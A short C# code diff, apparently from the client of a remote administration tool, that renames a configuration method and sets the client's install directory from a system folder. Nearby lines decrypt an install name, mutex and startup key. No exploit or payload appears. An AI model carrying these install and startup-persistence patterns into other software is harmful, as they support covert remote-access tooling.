@@ -28,7 +28,7 @@ namespace xClient.Config
 
         public static void Initialize()
         {
-            FixSpecialFolder();
+            FixDirectory();
         }
 #else
         public static string VERSION = "1.0.0.0r";
@@ -59,11 +59,11 @@ namespace xClient.Config
             INSTALLNAME = AES.Decrypt(INSTALLNAME);
             MUTEX = AES.Decrypt(MUTEX);
             STARTUPKEY = AES.Decrypt(STARTUPKEY);
-            FixSpecialFolder();
+            FixDirectory();
         }
 #endif
 
-        static void FixSpecialFolder()
+        static void FixDirectory()
         {
             if (PlatformHelper.Is64Bit) return;
 
@@ -77,6 +77,8 @@ namespace xClient.Config
                     SPECIALFOLDER = Environment.SpecialFolder.System;
                     break;
             }
+
+            DIR = Environment.GetFolderPath(SPECIALFOLDER);
         }
     }
 }
